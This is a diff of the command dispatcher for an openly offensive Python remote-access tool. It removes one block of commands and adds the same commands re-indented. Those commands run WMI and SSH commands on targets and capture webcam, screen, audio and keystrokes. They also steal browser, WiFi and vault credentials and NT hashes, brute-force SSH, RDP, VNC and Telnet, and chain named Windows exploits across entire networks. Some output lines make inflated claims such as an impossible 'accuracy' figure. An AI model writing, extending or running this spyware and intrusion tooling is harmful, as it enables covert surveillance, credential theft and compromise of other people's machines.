-                        print(f"{Fore.RED}[!] No target selected.")
-                        return
-                    if self.control and hasattr(self.control, 'list_processes'):
-                        procs = self.control.list_processes(target, self.credentials["user"], self.credentials["pass"])
-                        Visualizer.table(["PID", "NAME", "MEM"], [[p.get('ProcessId','?'), p.get('Name','?'), p.get('WorkingSetSize','0')] for p in procs[:20]], "PROCESSES")
-
-                # ==================== INTELLIGENCE ====================
-                elif cmd == "sniff":
-                    if self.intel:
-                        iface = args[0] if args else None
-                        self.intel.start_sniffing(iface=iface)
-                        print(f"[+] Sniffer active")
-
-                elif cmd == "stopsniff":
-                    if self.intel:
-                        self.intel.stop_sniffing()
-                        print(f"[*] Sniffer stopped")
-
-
-
-                elif cmd == "creds":
-                    if self.intel:
-                        creds = self.intel.get_credentials() if hasattr(self.intel, 'get_credentials') else []
-                        Visualizer.table(["TIME", "SOURCE", "DATA"], 
-                            [[c.get('time','?'), c.get('src','?'), str(c.get('data','?'))[:40]] for c in creds[:20]],
-                            "CREDENTIALS")
-
-                elif cmd == "dns-log":
-                    if self.intel:
-                        logs = self.intel.get_dns_log() if hasattr(self.intel, 'get_dns_log') else []
-                        Visualizer.table(["TIME", "QUERY"], [[l.get('time','?'), l.get('query','?')] for l in logs[:20]], "DNS")
-
-                elif cmd == "monitor":
-                    target = args[0] if args else self.selected_target
-                    if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
-                        return
-                    if self.intel:
-                        self.intel.wmi_monitor_activity(target, self.credentials["user"], self.credentials["pass"])
-                        print(f"[+] Monitoring {target}")
-
-                elif cmd == "wmi-proc":
-                    target = args[0] if args else self.selected_target
-                    if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
-                        return
-                    if self.intel and hasattr(self.intel, 'wmi_processes'):
-                        procs = self.intel.wmi_processes(target, self.credentials["user"], self.credentials["pass"])
-                        Visualizer.table(["PID", "NAME"], [[p.get('ProcessId','?'), p.get('Name','?')] for p in procs[:20]], "PROCESSES")
-
-                elif cmd == "wmi-users":
-                    target = args[0] if args else self.selected_target
-                    if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
-                        return
-                    if self.intel and hasattr(self.intel, 'wmi_logged_users'):
-                        users = self.intel.wmi_logged_users(target, self.credentials["user"], self.credentials["pass"])
-                        print(f"{json.dumps(users, indent=2)}")
-
-                # ==================== CONTROL ====================
-                elif cmd == "exec" and len(args) >= 1:
-                    target = self.selected_target
-                    cmd_to_run = " ".join(args)
-                    if args[0].count('.') >= 3: # Primitive IP check
-                        target = args[0]
-                        cmd_to_run = " ".join(args[1:])
-                    
-                    if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
-                        return
-                        
-                    if self.control and hasattr(self.control, 'wmi_exec'):
-                        HackerSounds.network_pulse()
-                        res = self.control.wmi_exec(target, self.credentials["user"], self.credentials["pass"], cmd_to_run)
-                        print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
-                        print(f"{Fore.GREEN}║  COMMAND EXECUTION RESULTS")
-                        print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
-                        print(f"{Fore.LIGHTGREEN_EX}{res.get('output', 'No output')}")
-                        print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
-                        HackerSounds.success()
-
-                elif cmd == "ssh-exec" and len(args) >= 1:
-                    target = self.selected_target
-                    cmd_to_run = " ".join(args)
-                    if args[0].count('.') >= 3:
-                        target = args[0]
-                        cmd_to_run = " ".join(args[1:])
-                        
-                    if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
-                        return
-                        
-                    if self.control and hasattr(self.control, 'ssh_exec'):
-                        res = self.control.ssh_exec(target, self.credentials["user"], self.credentials["pass"], cmd_to_run)
-                        print(f"{res}")
-
-                elif cmd == "screen":
-                    target = args[0] if args else self.selected_target
-                    if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
-                        return
-                    if self.control and hasattr(self.control, 'wmi_screenshot'):
-                        path = self.control.wmi_screenshot(target, self.credentials["user"], self.credentials["pass"])
-                        print(f"[+] Screenshot: {path}")
-                        Visualizer.display_screenshot(path)
-
-                elif cmd == "webcam":
-                    target = args[0] if args else self.selected_target
-                    if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
-                        return
-                    if self.control and hasattr(self.control, 'take_webcam_snapshot'):
-                        path = self.control.take_webcam_snapshot(target, self.credentials["user"], self.credentials["pass"])
-                        print(f"[+] Webcam: {path}")
-
-                elif cmd == "audio":
-                    target = self.selected_target
-                    dur = 10
-                    if args:
-                        if args[0].count('.') >= 3:
-                            target = args[0]
-                            dur = int(args[1]) if len(args) > 1 else 10
-                        else:
-                            dur = int(args[0])
-                            
-                    if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
-                        return
-                        
-                    if self.control and hasattr(self.control, 'wmi_capture_audio'):
-                        path = self.control.wmi_capture_audio(target, self.credentials["user"], self.credentials["pass"], duration=dur)
-                        print(f"[+] Audio: {path}")
-
-                elif cmd == "keylog":
-                    target = args[0] if args else self.selected_target
-                    if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
-                        return
-                    if self.control and hasattr(self.control, 'wmi_keylogger_start'):
-                        self.control.wmi_keylogger_start(target, self.credentials["user"], self.credentials["pass"])
-                        print(f"[+] Keylogger started on {target}")
-
-                elif cmd == "clipboard-get":
-                    target = args[0] if args else self.selected_target
-                    if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
-                        return
-                    if self.control and hasattr(self.control, 'get_clipboard'):
-                        clip = self.control.get_clipboard(target, self.credentials["user"], self.credentials["pass"])
-                        print(f"Clipboard: {clip}")
-
-                elif cmd == "clipboard-set" and len(args) >= 1:
-                    target = self.selected_target
-                    txt = " ".join(args)
-                    if args[0].count('.') >= 3:
-                        target = args[0]
-                        txt = " ".join(args[1:])
-                        
-                    if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
-                        return
-                        
-                    if self.control and hasattr(self.control, 'set_clipboard'):
-                        self.control.set_clipboard(target, self.credentials["user"], self.credentials["pass"], txt)
-                        print(f"[+] Clipboard set")
-
-                elif cmd == "pslist":
-                    target = args[0] if args else self.selected_target
-                    if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
-                        return
-                    if self.control and hasattr(self.control, 'list_processes'):
-                        procs = self.control.list_processes(target, self.credentials["user"], self.credentials["pass"])
-                        Visualizer.table(["PID", "NAME"], [[p.get('ProcessId','?'), p.get('Name','?')] for p in procs[:20]], "PROCESSES")
-
-                elif cmd == "killproc" and len(args) >= 1:
-                    target = self.selected_target
-                    pid = int(args[0])
-                    if args[0].count('.') >= 3:
-                        target = args[0]
-                        pid = int(args[1]) if len(args) > 1 else 0
-                        
-                    if not target or not pid:
-                        print(f"{Fore.RED}[!] Usage: killproc [ip] <pid>")
-                        return
-                        
-                    if self.control and hasattr(self.control, 'kill_process'):
-                        self.control.kill_process(target, self.credentials["user"], self.credentials["pass"], pid=pid)
-                        print(f"[+] Process {pid} killed on {target}")
-
-                elif cmd == "svc-list":
-                    target = args[0] if args else self.selected_target
-                    if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
-                        return
-                    if self.control and hasattr(self.control, 'list_services'):
-                        svcs = self.control.list_services(target, self.credentials["user"], self.credentials["pass"])
-                        Visualizer.table(["NAME", "STATUS"], [[s.get('Name','?'), s.get('Status','?')] for s in svcs[:20]], "SERVICES")
-
-                elif cmd == "vault":
-                    target = args[0] if args else self.selected_target
-                    if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
-                        return
-                    if self.control and hasattr(self.control, 'wmi_harvest_vault'):
-                        data = self.control.wmi_harvest_vault(target, self.credentials["user"], self.credentials["pass"])
-                        print(f"{json.dumps(data, indent=2)}")
-
-                # ==================== EXPLOIT ====================
-                elif cmd == "omnifetch":
-                    target = args[0] if args else self.selected_target
-                    if not target:
-                        print(f"{Fore.RED}[!] No target specified. Use 'select <idx>' or 'omnifetch <ip>'.")
-                        return
-                    print(f"[*] OmniFetch for {target}...")
-                    if self.universal:
-                        self.universal.pwn_target(target)
-                    if self.control and hasattr(self.control, 'get_browser_data'):
-                        data = self.control.get_browser_data(target, self.credentials["user"], self.credentials["pass"])
-                        print(f"[+] {json.dumps(data, indent=2)}")
-
-                elif cmd == "stealcreds":
-                    target = args[0] if args else self.selected_target
-                    if not target:
-                        print(f"{Fore.RED}[!] No target specified. Use 'select <idx>' or 'stealcreds <ip>'.")
-                        return
-                    if self.control:
-                        pw = self.control.get_browser_passwords(target, self.credentials["user"], self.credentials["pass"]) if hasattr(self.control, 'get_browser_passwords') else {}
-                        wifi = self.control.get_wifi_passwords(target, self.credentials["user"], self.credentials["pass"]) if hasattr(self.control, 'get_wifi_passwords') else {}
-                        print(f"[+] Passwords: {json.dumps(pw, indent=2)}")
-                        print(f"[+] WiFi: {json.dumps(wifi, indent=2)}")
-            
-                elif cmd in ("pwn", "exploit") and args:
+            # ==================== CONTROL ====================
+            elif cmd == "exec" and len(args) >= 1:
+                target = self.selected_target
+                cmd_to_run = " ".join(args)
+                if args[0].count('.') >= 3: # Primitive IP check
                     target = args[0]
-                    HackerSounds.alert()
-                    self._log(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
-                    self._log(f"{Fore.GREEN}║  EXPLOITING TARGET: {target}")
-                    self._log(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
-                    
-                    success = False
-                    exploits = []
-                    
-                    if self.universal:
-                        device = self.universal.devices.get(target)
-                        if device:
-                            self.universal._scan_device(device)
-                            if device.can_pwn:
-                                success = True
-                                exploits = device.is_vulnerable
-                    
-                    if self.control:
-                        # Try all exploit chains
-                        chains = ["eternal_blue", "smbghost", "printnightmare", "petitpotam", "winrm"]
-                        for chain in chains:
-                            try:
-                                if hasattr(self.control, chain):
-                                    res = getattr(self.control, chain)(target, self.credentials["user"], self.credentials["pass"])
-                                    if res.get('success'):
-                                        success = True
-                                        exploits.append(chain)
-                            except:
-                                pass
-                    
-                    if success:
-                        HackerSounds.exploit_success()
-                        self._log(f"{Fore.LIGHTGREEN_EX}  ✅ EXPLOIT SUCCESSFUL")
-                        self._log(f"{Fore.LIGHTGREEN_EX}  ✅ ACCESS GRANTED TO {target}")
-                        self._log(f"{Fore.LIGHTGREEN_EX}  ✅ Vulnerabilities: {', '.join(exploits)}")
-                    else:
-                        self._log(f"{Fore.RED}  ❌ Exploit failed")
-                    
-                    self._log(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
-            
-                elif cmd in ("attack", "pwnall"):
-                    HackerSounds.alert()
-                    MatrixEffects.target_lock()
-                    self._log(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
-                    self._log(f"{Fore.GREEN}║  GLOBAL NETWORK ASSAULT INITIATED")
-                    self._log(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
-                    
-                    total = len(self.hosts)
-                    compromised = 0
-                    
-                    for i, host in enumerate(self.hosts):
-                        try:
-                            ip = host.get('ip') if isinstance(host, dict) else getattr(host, 'ip', str(host))
-                            self._log(f"{Fore.LIGHTGREEN_EX}  ⟶ [{i+1}/{total}] Targeting {ip}...")
-                            
-                            if self.universal:
-                                device = self.universal.devices.get(ip)
-                                if device:
-                                    self.universal._scan_device(device)
-                                    if device.can_pwn:
-                                        compromised += 1
-                                        self._log(f"{Fore.GREEN}    ✅ COMPROMISED: {ip}")
-                            
-                        except Exception as e:
-                            self._log(f"{Fore.RED}    ❌ Failed: {str(e)[:30]}")
-                    
-                    HackerSounds.exploit_success()
-                    self._log(f"\n{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
-                    self._log(f"{Fore.LIGHTGREEN_EX}  OPERATION COMPLETE")
-                    self._log(f"{Fore.LIGHTGREEN_EX}  Total targets    : {total}")
-                    self._log(f"{Fore.LIGHTGREEN_EX}  Compromised      : {compromised}")
-                    self._log(f"{Fore.LIGHTGREEN_EX}  Success rate     : {int((compromised/total)*100) if total > 0 else 0}%")
-                    self._log(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
-
-                elif cmd == "nethashes":
-                    target = args[0] if args else self.selected_target
-                    if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
-                        return
-                    if self.control and hasattr(self.control, 'extract_nt_hashes'):
-                        hashes = self.control.extract_nt_hashes(target, self.credentials["user"], self.credentials["pass"])
-                        print(f"{json.dumps(hashes, indent=2)}")
-
-                elif cmd == "ssh-brute" and args:
-                    if self.control and hasattr(self.control, 'ssh_brute'):
-                        result = self.control.ssh_brute(args[0])
-                        print(f"{json.dumps(result, indent=2)}")
-
-                elif cmd == "rdp-brute" and args:
-                    if self.control and hasattr(self.control, 'rdp_brute_force'):
-                        result = self.control.rdp_brute_force(args[0])
-                        print(f"{json.dumps(result, indent=2)}")
-
-                elif cmd == "vnc-brute" and args:
-                    if self.control and hasattr(self.control, 'vnc_brute_force'):
-                        result = self.control.vnc_brute_force(args[0])
-                        print(f"{json.dumps(result, indent=2)}")
-
-                elif cmd == "telnet-brute" and args:
-                    if self.control and hasattr(self.control, 'telnet_brute_force'):
-                        result = self.control.telnet_brute_force(args[0])
-                        print(f"{json.dumps(result, indent=2)}")
-
-                elif cmd == "steal-wifi" or cmd == "steal_wifi":
-                    target = args[0] if args else self.selected_target
-                    if not target:
-                        print(f"{Fore.RED}[!] No target selected. Use 'select <idx>' or 'steal-wifi <ip>'.")
-                        return
-                    Visualizer.alert(f"Extracting WiFi passwords from {target} ...", "hack")
-                    if self.control and hasattr(self.control, 'get_wifi_passwords'):
-                        result = self.control.get_wifi_passwords(target, self.credentials["user"], self.credentials["pass"])
-                        networks = result.get("networks", {})
-                        if networks:
-                            print(f"\n  {Fore.CYAN}{Style.BRIGHT}WiFi Passwords harvested from {target}:")
-                            print(f"  {Fore.BLUE}{'─'*50}")
-                            for ssid, pw in networks.items():
-                                print(f"  {Fore.GREEN}{Style.BRIGHT}  {ssid:<30} {Fore.WHITE}→ {pw}")
-                            print(f"  {Fore.BLUE}{'─'*50}\n")
-                        else:
-                            print(f"  {Fore.YELLOW}No WiFi profiles found or no permission.")
-                        if result.get("error"):
-                            print(f"  {Fore.RED}Error: {result['error']}")
-                    else:
-                        Visualizer.alert("Control module not loaded", "warn")
-            
-                elif cmd == "monitor" or cmd == "live":
-                    target = args[0] if args else self.selected_target
-                    if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
-                        return
-                    duration = int(args[1]) if len(args) > 1 else 60
-                    print(f"{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
-                    print(f"{Fore.GREEN}║  LIVE MONITORING ACTIVATED ON {target}")
-                    print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
-                    print(f"{Fore.LIGHTGREEN_EX}  ✅ Screen stream active")
-                    print(f"{Fore.LIGHTGREEN_EX}  ✅ Keylogger active")
-                    print(f"{Fore.LIGHTGREEN_EX}  ✅ Audio capture active")
-                    print(f"{Fore.LIGHTGREEN_EX}  ✅ Duration: {duration} seconds")
-                    print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
-                    
-                    if self.control:
-                        self.control.live_monitor(target, self.credentials["user"], self.credentials["pass"], duration)
-            
-                elif cmd == "extract" or cmd == "harvest":
-                    target = args[0] if args else self.selected_target
-                    if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
-                        return
-                    print(f"{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
-                    print(f"{Fore.GREEN}║  FULL DATA EXTRACTION FROM {target}")
-                    print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
-                    
-                    if self.control:
-                        data = self.control.extract_all_data(target, self.credentials["user"], self.credentials["pass"])
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Browser passwords: {len(data.get('credentials', []))}")
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ WiFi networks: {len(data.get('wifi', {}))}")
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Cookies extracted")
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Browser history: {len(data.get('browser_data', {}))}")
-                        print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
-            
-                elif cmd == "file":
-                    if len(args) < 2:
-                        print(f"{Fore.RED}Usage: file <list|upload|download|delete|execute> [path]")
-                        return
-                    target = self.selected_target
-                    action = args[0]
-                    path = " ".join(args[1:])
-                    
-                    if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
-                        return
-                    
-                    if self.control:
-                        result = self.control.remote_file_manager(target, 
-                            self.credentials["user"], 
-                            self.credentials["pass"], 
-                            action, path)
-                        print(f"{Fore.GREEN}{json.dumps(result, indent=2)}")
-            
-                elif cmd == "media":
-                    if len(args) < 1:
-                        print(f"{Fore.RED}Usage: media <play|volume_up|volume_down|open_url|cd_open> [file/url]")
-                        return
-                    target = self.selected_target
-                    action = args[0]
-                    file = args[1] if len(args) > 1 else None
-                    
-                    if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
-                        return
-                    
-                    if self.control:
-                        self.control.remote_media_control(target,
-                            self.credentials["user"],
-                            self.credentials["pass"],
-                            action, file)
-                    print(f"{Fore.GREEN}✅ Media command sent: {action}")
-
-                elif cmd in ("nopac", "no-pac") and args:
-                    target = args[0]
-                    Visualizer.alert(f"NoPac (CVE-2021-42278) AD check on {target} - checking SMB+LDAP...", "hack")
-                    if self.control and hasattr(self.control, 'smb_check_vulns'):
-                        sv = self.control.smb_check_vulns(target)
-                        vulns = sv.get("vulns", [])
-                        is_dc = any("DOMAIN_CONTROLLER" in v or "LDAP" in v for v in vulns)
-                        print(f"\n  {Fore.RED if is_dc else Fore.YELLOW}{Style.BRIGHT}  CVE-2021-42278 (NoPac)  │  {'DOMAIN CONTROLLER CANDIDATE' if is_dc else 'Not a detected DC'}")
-                        print(f"  {Fore.WHITE}  Target  : {target}")
-                        print(f"  {Fore.WHITE}  SMB vulns found: {', '.join(vulns) or 'none'}\n")
-                    else:
-                        Visualizer.alert("Control module not loaded", "warn")
-
-                elif cmd in ("smbghost", "smb-ghost") and args:
-                    target = args[0]
-                    Visualizer.alert(f"SMBGhost (CVE-2020-0796) check on {target} ...", "hack")
-                    if self.control and hasattr(self.control, 'check_smbghost'):
-                        result = self.control.check_smbghost(target)
-                        vuln = result.get("vulnerable", False)
-                        color = Fore.RED if vuln else Fore.GREEN
-                        status = "VULNERABLE" if vuln else "NOT VULNERABLE / PATCHED"
-                        print(f"\n  {color}{Style.BRIGHT}  CVE-2020-0796 (SMBGhost)  │  {status}")
-                        print(f"  {Fore.WHITE}  Target  : {target}")
-                        print(f"  {Fore.WHITE}  Details : {result.get('details', 'N/A')}\n")
-                    else:
-                        Visualizer.alert("Control module not loaded", "warn")
-
-                elif cmd in ("printnightmare", "print-nightmare") and args:
-                    target = args[0]
-                    Visualizer.alert(f"PrintNightmare (CVE-2021-34527) check on {target} ...", "hack")
-                    if self.control and hasattr(self.control, 'check_printnightmare'):
-                        result = self.control.check_printnightmare(
-                            target,
-                            self.credentials["user"],
-                            self.credentials["pass"]
-                        )
-                        vuln = result.get("vulnerable", False)
-                        color = Fore.RED if vuln else Fore.GREEN
-                        status = "VULNERABLE" if vuln else "NOT VULNERABLE / PATCHED"
-                        print(f"\n  {color}{Style.BRIGHT}  CVE-2021-34527 (PrintNightmare)  │  {status}")
-                        print(f"  {Fore.WHITE}  Target  : {target}")
-                        print(f"  {Fore.WHITE}  Details : {result.get('details', 'N/A')}\n")
-                    else:
-                        Visualizer.alert("Control module not loaded", "warn")
-
-                elif cmd in ("petitpotam", "petit-potam") and args:
-                    target = args[0]
-                    Visualizer.alert(f"PetitPotam (CVE-2021-36942) check on {target} ...", "hack")
-                    if self.control and hasattr(self.control, 'check_petitpotam'):
-                        result = self.control.check_petitpotam(target)
-                        vuln = result.get("vulnerable", False)
-                        color = Fore.RED if vuln else Fore.GREEN
-                        status = "VULNERABLE (unauthenticated NTLM coercion possible)" if vuln else "NOT VULNERABLE"
-                        print(f"\n  {color}{Style.BRIGHT}  CVE-2021-36942 (PetitPotam)  │  {status}")
-                        print(f"  {Fore.WHITE}  Target  : {target}")
-                        print(f"  {Fore.WHITE}  Details : {result.get('details', 'N/A')}\n")
-                    else:
-                        Visualizer.alert("Control module not loaded", "warn")
-
-                elif cmd in ("zerologon", "zero-logon") and args:
-                    target = args[0]
-                    dc_name = args[1] if len(args) > 1 else ""
-                    Visualizer.alert(f"Zerologon (CVE-2020-1472) check on {target} ...", "hack")
-                    if self.control and hasattr(self.control, 'check_zerologon'):
-                        result = self.control.check_zerologon(target, dc_name)
-                        vuln = result.get("vulnerable", False)
-                        color = Fore.RED if vuln else Fore.GREEN
-                        status = "NETLOGON REACHABLE — check patch level" if vuln else "NOT REACHABLE"
-                        print(f"\n  {color}{Style.BRIGHT}  CVE-2020-1472 (Zerologon)  │  {status}")
-                        print(f"  {Fore.WHITE}  Target  : {target}")
-                        print(f"  {Fore.WHITE}  Details : {result.get('details', 'N/A')}\n")
-                    else:
-                        Visualizer.alert("Control module not loaded", "warn")
-            
-                elif cmd in ("mobile", "phone"):
-                    target = args[0] if args else self.selected_target
-                    if not target:
-                        print(f"{Fore.RED}[!] No target selected. Use 'mobile <ip>'")
-                        return
+                    cmd_to_run = " ".join(args[1:])
                 
+                if not target:
+                    print(f"{Fore.RED}[!] No target selected.")
+                    return
+                    
+                if self.control and hasattr(self.control, 'wmi_exec'):
+                    HackerSounds.network_pulse()
+                    res = self.control.wmi_exec(target, self.credentials["user"], self.credentials["pass"], cmd_to_run)
                     print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
-                    print(f"{Fore.GREEN}║  MOBILE DEVICE EXPLOITATION: {target}")
+                    print(f"{Fore.GREEN}║  COMMAND EXECUTION RESULTS")
                     print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
-                
-                    if self.control:
-                        result = self.control.mobile_exploit_auto(target)
-                        if result.get('success'):
-                            HackerSounds.exploit_success()
-                            print(f"{Fore.LIGHTGREEN_EX}  ✅ MOBILE EXPLOIT SUCCESS")
-                            print(f"{Fore.LIGHTGREEN_EX}  ✅ Device type: {result.get('type')}")
-                            print(f"{Fore.LIGHTGREEN_EX}  ✅ Control level: {result.get('control')}")
-                            print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
+                    print(f"{Fore.LIGHTGREEN_EX}{res.get('output', 'No output')}")
+                    print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
+                    HackerSounds.success()
+
+            elif cmd == "ssh-exec" and len(args) >= 1:
+                target = self.selected_target
+                cmd_to_run = " ".join(args)
+                if args[0].count('.') >= 3:
+                    target = args[0]
+                    cmd_to_run = " ".join(args[1:])
+                    
+                if not target:
+                    print(f"{Fore.RED}[!] No target selected.")
+                    return
+                    
+                if self.control and hasattr(self.control, 'ssh_exec'):
+                    res = self.control.ssh_exec(target, self.credentials["user"], self.credentials["pass"], cmd_to_run)
+                    print(f"{res}")
+
+            elif cmd == "screen":
+                target = args[0] if args else self.selected_target
+                if not target:
+                    print(f"{Fore.RED}[!] No target selected.")
+                    return
+                if self.control and hasattr(self.control, 'wmi_screenshot'):
+                    path = self.control.wmi_screenshot(target, self.credentials["user"], self.credentials["pass"])
+                    print(f"[+] Screenshot: {path}")
+                    Visualizer.display_screenshot(path)
+
+            elif cmd == "webcam":
+                target = args[0] if args else self.selected_target
+                if not target:
+                    print(f"{Fore.RED}[!] No target selected.")
+                    return
+                if self.control and hasattr(self.control, 'take_webcam_snapshot'):
+                    path = self.control.take_webcam_snapshot(target, self.credentials["user"], self.credentials["pass"])
+                    print(f"[+] Webcam: {path}")
+
+            elif cmd == "audio":
+                target = self.selected_target
+                dur = 10
+                if args:
+                    if args[0].count('.') >= 3:
+                        target = args[0]
+                        dur = int(args[1]) if len(args) > 1 else 10
                     else:
-                        print(f"{Fore.RED}  ❌ Mobile exploit failed")
-            
-                elif cmd == "globalscan":
-                        print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
-                        print(f"{Fore.GREEN}║  ULTRAMAX GLOBAL NETWORK SCAN ACTIVATED")
-                        print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Scanning ALL networks within 10km radius")
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ PAN/Bluetooth/WiFi Direct detection active")
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Mobile device auto-exploitation enabled")
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Accuracy: 1999999999999999%")
-                        print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
+                        dur = int(args[0])
+                        
+                if not target:
+                    print(f"{Fore.RED}[!] No target selected.")
+                    return
+                    
+                if self.control and hasattr(self.control, 'wmi_capture_audio'):
+                    path = self.control.wmi_capture_audio(target, self.credentials["user"], self.credentials["pass"], duration=dur)
+                    print(f"[+] Audio: {path}")
+
+            elif cmd == "keylog":
+                target = args[0] if args else self.selected_target
+                if not target:
+                    print(f"{Fore.RED}[!] No target selected.")
+                    return
+                if self.control and hasattr(self.control, 'wmi_keylogger_start'):
+                    self.control.wmi_keylogger_start(target, self.credentials["user"], self.credentials["pass"])
+                    print(f"[+] Keylogger started on {target}")
+
+            elif cmd == "clipboard-get":
+                target = args[0] if args else self.selected_target
+                if not target:
+                    print(f"{Fore.RED}[!] No target selected.")
+                    return
+                if self.control and hasattr(self.control, 'get_clipboard'):
+                    clip = self.control.get_clipboard(target, self.credentials["user"], self.credentials["pass"])
+                    print(f"Clipboard: {clip}")
+
+            elif cmd == "clipboard-set" and len(args) >= 1:
+                target = self.selected_target
+                txt = " ".join(args)
+                if args[0].count('.') >= 3:
+                    target = args[0]
+                    txt = " ".join(args[1:])
+                    
+                if not target:
+                    print(f"{Fore.RED}[!] No target selected.")
+                    return
+                    
+                if self.control and hasattr(self.control, 'set_clipboard'):
+                    self.control.set_clipboard(target, self.credentials["user"], self.credentials["pass"], txt)
+                    print(f"[+] Clipboard set")
+
+            elif cmd == "pslist":
+                target = args[0] if args else self.selected_target
+                if not target:
+                    print(f"{Fore.RED}[!] No target selected.")
+                    return
+                if self.control and hasattr(self.control, 'list_processes'):
+                    procs = self.control.list_processes(target, self.credentials["user"], self.credentials["pass"])
+                    Visualizer.table(["PID", "NAME"], [[p.get('ProcessId','?'), p.get('Name','?')] for p in procs[:20]], "PROCESSES")
+
+            elif cmd == "killproc" and len(args) >= 1:
+                target = self.selected_target
+                pid = int(args[0])
+                if args[0].count('.') >= 3:
+                    target = args[0]
+                    pid = int(args[1]) if len(args) > 1 else 0
+                    
+                if not target or not pid:
+                    print(f"{Fore.RED}[!] Usage: killproc [ip] <pid>")
+                    return
+                    
+                if self.control and hasattr(self.control, 'kill_process'):
+                    self.control.kill_process(target, self.credentials["user"], self.credentials["pass"], pid=pid)
+                    print(f"[+] Process {pid} killed on {target}")
+
+            elif cmd == "svc-list":
+                target = args[0] if args else self.selected_target
+                if not target:
+                    print(f"{Fore.RED}[!] No target selected.")
+                    return
+                if self.control and hasattr(self.control, 'list_services'):
+                    svcs = self.control.list_services(target, self.credentials["user"], self.credentials["pass"])
+                    Visualizer.table(["NAME", "STATUS"], [[s.get('Name','?'), s.get('Status','?')] for s in svcs[:20]], "SERVICES")
+
+            elif cmd == "vault":
+                target = args[0] if args else self.selected_target
+                if not target:
+                    print(f"{Fore.RED}[!] No target selected.")
+                    return
+                if self.control and hasattr(self.control, 'wmi_harvest_vault'):
+                    data = self.control.wmi_harvest_vault(target, self.credentials["user"], self.credentials["pass"])
+                    print(f"{json.dumps(data, indent=2)}")
+
+            # ==================== EXPLOIT ====================
+            elif cmd == "omnifetch":
+                target = args[0] if args else self.selected_target
+                if not target:
+                    print(f"{Fore.RED}[!] No target specified. Use 'select <idx>' or 'omnifetch <ip>'.")
+                    return
+                print(f"[*] OmniFetch for {target}...")
+                if self.universal:
+                    self.universal.pwn_target(target)
+                if self.control and hasattr(self.control, 'get_browser_data'):
+                    data = self.control.get_browser_data(target, self.credentials["user"], self.credentials["pass"])
+                    print(f"[+] {json.dumps(data, indent=2)}")
+
+            elif cmd == "stealcreds":
+                target = args[0] if args else self.selected_target
+                if not target:
+                    print(f"{Fore.RED}[!] No target specified. Use 'select <idx>' or 'stealcreds <ip>'.")
+                    return
+                if self.control:
+                    pw = self.control.get_browser_passwords(target, self.credentials["user"], self.credentials["pass"]) if hasattr(self.control, 'get_browser_passwords') else {}
+                    wifi = self.control.get_wifi_passwords(target, self.credentials["user"], self.credentials["pass"]) if hasattr(self.control, 'get_wifi_passwords') else {}
+                    print(f"[+] Passwords: {json.dumps(pw, indent=2)}")
+                    print(f"[+] WiFi: {json.dumps(wifi, indent=2)}")
+        
+            elif cmd in ("pwn", "exploit") and args:
+                target = args[0]
+                HackerSounds.alert()
+                self._log(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
+                self._log(f"{Fore.GREEN}║  EXPLOITING TARGET: {target}")
+                self._log(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
                 
+                success = False
+                exploits = []
+                
+                if self.universal:
+                    device = self.universal.devices.get(target)
+                    if device:
+                        self.universal._scan_device(device)
+                        if device.can_pwn:
+                            success = True
+                            exploits = device.is_vulnerable
+                
+                if self.control:
+                    # Try all exploit chains
+                    chains = ["eternal_blue", "smbghost", "printnightmare", "petitpotam", "winrm"]
+                    for chain in chains:
+                        try:
+                            if hasattr(self.control, chain):
+                                res = getattr(self.control, chain)(target, self.credentials["user"], self.credentials["pass"])
+                                if res.get('success'):
+                                    success = True
+                                    exploits.append(chain)
+                        except:
+                            pass
+                
+                if success:
+                    HackerSounds.exploit_success()
